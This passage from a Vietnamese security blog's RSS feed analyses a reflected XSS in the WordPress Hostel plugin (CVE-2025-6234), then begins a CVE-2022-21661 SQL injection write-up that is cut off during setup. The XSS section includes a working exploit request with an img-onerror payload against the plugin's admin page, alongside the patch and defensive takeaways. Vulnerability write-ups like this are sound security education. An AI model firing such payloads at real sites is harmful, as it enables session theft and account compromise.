@$_GET[&#39;ob&#39;]?&amp;gt;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Vì source không đi qua &lt;strong&gt;logic của controllers&lt;/strong&gt; nên ta không cần quan tâm diff của &lt;code&gt;controllers/bookings.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; được echo ra HTML attribute của thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; thì điều kiện trong khối &lt;code&gt;if&lt;/code&gt; chứa thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; phải &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt; &#xA;&amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt;&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Điều kiện quan trọng cần chú ý là &lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt;, vì chỉ cần điều kiện này đúng thì XSS đã có thể xảy ra. Không cần quan tâm &lt;code&gt;if($count &amp;gt; ($page_limit + $offset))&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;File &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; không thể truy cập trực tiếp, mà phải được &lt;strong&gt;controllers&lt;/strong&gt; gọi thông qua hàm &lt;code&gt;include()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Biến &lt;code&gt;$offset&lt;/code&gt; được &lt;strong&gt;controller&lt;/strong&gt; khởi tạo trước rồi truyền sang &lt;strong&gt;view&lt;/strong&gt; (&lt;strong&gt;views/bookings.html.php&lt;/strong&gt;) để dùng trong mệnh đề &lt;code&gt;if&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Để xác định &lt;strong&gt;controller&lt;/strong&gt; nào gọi file view này, ta tìm kiếm biến &lt;code&gt;$offset&lt;/code&gt; trong thư mục controllers của plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_controllers.png&#34;&#xA;    alt=&#34;Tìm biến $offset trong thư mục controllers&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm biến $offset trong thư mục controllers&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Kết quả cho thấy &lt;code&gt;$offset&lt;/code&gt; được tạo trong nhánh &lt;code&gt;default&lt;/code&gt; (&lt;strong&gt;listing bookings&lt;/strong&gt;) của hàm tĩnh &lt;code&gt;manage()&lt;/code&gt; trong class &lt;code&gt;WPHostelBookings&lt;/code&gt;, nằm ở file &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Controller Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            // other logic&#xA;            &#xA;            // list bookings&#xA;            default:&#xA;                // which bookings to show - upcoming or past?&#xA;                $type = empty($_GET[&amp;#39;type&amp;#39;]) ? &amp;#39;upcoming&amp;#39; : sanitize_text_field($_GET[&amp;#39;type&amp;#39;]);&#xA;                $offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&#xA;                $dir = empty($_GET[&amp;#39;dir&amp;#39;]) ? &amp;#39;ASC&amp;#39; : $_GET[&amp;#39;dir&amp;#39;];&#xA;                if($dir != &amp;#39;ASC&amp;#39; and $dir != &amp;#39;DESC&amp;#39;) $dir = &amp;#39;ASC&amp;#39;;&#xA;                $odir = ($dir == &amp;#39;ASC&amp;#39;) ? &amp;#39;DESC&amp;#39; : &amp;#39;ASC&amp;#39;;&#xA;                &#xA;                // other logic&#xA;                &#xA;                // define limit (as it&amp;#39;s paginated)&#x9;&#x9;&#x9;&#x9;&#xA;                $page_limit = 20;&#xA;                $limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &#xA;                &#xA;                // other logic&#x9;&#xA;                &#xA;                $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;                    FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;                    WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;                $count = $wpdb-&amp;gt;get_var(&amp;#34;SELECT FOUND_ROWS()&amp;#34;);&#x9;&#xA;                &#xA;                // other logic&#xA;&#xA;                if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;                else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&#x9;&#x9;&#x9;  &#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Phân tích biến &lt;code&gt;$offset&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Biến &lt;code&gt;$offset&lt;/code&gt; được khởi tạo từ tham số &lt;code&gt;offset&lt;/code&gt; trong &lt;strong&gt;URL&lt;/strong&gt; (&lt;code&gt;$_GET[&#39;offset&#39;]&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu không có tham số =&amp;gt; mặc định &lt;code&gt;0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu có =&amp;gt; ép kiểu số nguyên bằng &lt;code&gt;intval()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Phân tích biến &lt;code&gt;$page_limit&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$page_limit&lt;/code&gt; được đặt cố định là &lt;code&gt;20&lt;/code&gt;, dùng kết hợp với &lt;code&gt;$offset&lt;/code&gt; để phân trang:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// define limit (as it&amp;#39;s paginated)&#x9;&#x9;&#x9;&#x9;&#xA;$page_limit = 20;&#xA;&#xA;// LIMIT offset, 20&#xA;$limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó SQL trả về tối đa &lt;strong&gt;20 bản ghi&lt;/strong&gt;, bắt đầu từ vị trí &lt;code&gt;$offset&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Áp dụng vào mệnh đề if&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Trong view, đoạn code XSS payload chỉ hiển thị khi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt; =&amp;gt; tức là phải có offset từ &lt;strong&gt;1 trở lên&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Muốn &lt;code&gt;offset &amp;gt; 0&lt;/code&gt; có ý nghĩa, cơ sở dữ liệu phải có ít nhất &lt;strong&gt;2 booking&lt;/strong&gt;. Nếu chỉ có 1 booking thì sau khi bỏ qua 1 dòng (offset=1), không còn dữ liệu nào để hiển thị, nên payload cũng không render ra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Do đó, để khai thác thành công, cần có tối thiểu &lt;strong&gt;2 booking&lt;/strong&gt; trong database.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng các kết quả được chứa trong các biến sẽ được hiển thị ra views thông qua hàm &lt;code&gt;include()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;WPHOSTEL_PATH&lt;/code&gt; có thể là hằng global được sử dụng sau khi file &lt;strong&gt;PHP&lt;/strong&gt; chứa nó được load, Để biết được chính xác, ta tìm kiếm với từ khóa &lt;code&gt;WPHOSTEL_PATH&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_path.png&#34;&#xA;    alt=&#34;Đường dẫn tuyệt đối tới thư mục plugin&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Đường dẫn tuyệt đối tới thư mục plugin&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Request với XSS payload&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;offset=1&amp;amp;ob=&amp;#34;&amp;gt;&amp;lt;img&amp;#43;src%3D1&amp;#43;onerror%3Dalert%28document.domain%29&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Payload thực tế&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Đóng thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; bằng ký tự &lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Chèn thêm thẻ &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; có thuộc tính &lt;code&gt;onerror&lt;/code&gt; để &lt;strong&gt;kích hoạt JavaScript&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;alert(document.domain)&lt;/code&gt; thay cho &lt;code&gt;alert(1)&lt;/code&gt; như một thói quen, nhằm chứng minh rõ ràng khả năng đọc thông tin từ DOM. Điều này cũng giúp tránh trường hợp &lt;a href=&#34;https://bughunters.google.com/learn/invalid-reports/web-platform/xss/6619189462433792/xss-in-sandbox-domains&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Sandbox Domain&lt;/a&gt; khiến cho tác động của &lt;code&gt;payload&lt;/code&gt; bị xem nhẹ hoặc không có.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kết quả&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/xss_success.png&#34;&#xA;    alt=&#34;XSS phản chiếu thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS phản chiếu thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-6234&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Hostel&lt;/strong&gt; bắt nguồn từ việc không xử lý đúng dữ liệu đầu vào &lt;code&gt;($_GET[&#39;ob&#39;])&lt;/code&gt; trước khi phản hồi lại trên giao diện. Điều này mở ra khả năng cho attacker chèn mã độc &lt;strong&gt;Reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã khắc phục bằng cách sử dụng hàm &lt;code&gt;esc_attr()&lt;/code&gt; để escape dữ liệu trước khi in ra HTML, đảm bảo rằng các giá trị không tin cậy không thể chèn script độc hại.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;sanitize&lt;/strong&gt; dữ liệu đầu vào và &lt;strong&gt;escape&lt;/strong&gt; dữ liệu đầu ra theo ngữ cảnh (context).&lt;/li&gt;&#xA;&lt;li&gt;Với WordPress, tận dụng các hàm built-in như &lt;code&gt;sanitize_text_field()&lt;/code&gt;, &lt;code&gt;esc_attr()&lt;/code&gt;, &lt;code&gt;esc_html()&lt;/code&gt;, &lt;code&gt;wp_kses()&lt;/code&gt;&amp;hellip; để giảm thiểu rủi ro bảo mật.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;XSSCross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-plugin-1-1-5-8-reflected-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2022-21661 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-01-cve-2022-21661/</link>
      <pubDate>Wed, 01 Oct 2025 12:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-01-cve-2022-21661/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Do việc làm sạch dữ liệu (&lt;strong&gt;sanitization&lt;/strong&gt;) không đúng cách trong &lt;code&gt;WP_Query&lt;/code&gt;, có những trường hợp có thể xảy ra &lt;strong&gt;SQL Injection&lt;/strong&gt; thông qua các &lt;strong&gt;plugin&lt;/strong&gt; hoặc &lt;strong&gt;theme&lt;/strong&gt; sử dụng nó theo một cách nhất định. Lỗ hổng này đã được vá trong WordPress phiên bản &lt;strong&gt;5.8.3&lt;/strong&gt;. Các phiên bản cũ hơn bị ảnh hưởng cũng đã được sửa thông qua bản phát hành bảo mật, quay ngược lại đến tận phiên bản &lt;strong&gt;3.7.37&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &lt;code&gt;3.7.37 ≤ version &amp;lt; 5.8.3&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (8.0)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;: v5.8.2(vul)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup&#34;&gt;&lt;span&gt;Setup&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-php-version&#34;&gt;&lt;span&gt;Required PHP Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-php-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress được xây dựng hoàn toàn bằng PHP, vì vậy phiên bản PHP trên máy chủ có ảnh hưởng trực tiếp đến khả năng hoạt động của WordPress:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mỗi phiên bản PHP đều bổ sung tính năng mới và loại bỏ dần các hàm/cú pháp lỗi thời.&lt;/li&gt;&#xA;&lt;li&gt;Nếu WordPress dùng tính năng mới nhưng PHP trên server quá cũ =&amp;gt; sẽ phát sinh lỗi cú pháp (syntax error) hoặc không chạy được.&lt;/li&gt;&#xA;&lt;li&gt;Ngược lại, nếu PHP quá mới, một số hàm cũ mà WordPress vẫn còn sử dụng có thể đã deprecated hoặc bị loại bỏ hoàn toàn, gây lỗi khi chạy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Do đó, cần lựa chọn phiên bản PHP tương thích với phiên bản WordPress. Trong phân tích này, ta sử dụng PHP &lt;strong&gt;7.4&lt;/strong&gt; để cài đặt WordPress &lt;strong&gt;5.8.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vscode-extensions&#34;&gt;&lt;span&gt;VSCode Extensions&lt;/span&gt;&#xA;  &lt;a href=&#34;#vscode-extensions&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress có mã nguồn phức tạp, nên việc đọc từng dòng code thủ công là không khả thi. Để hỗ trợ quá trình 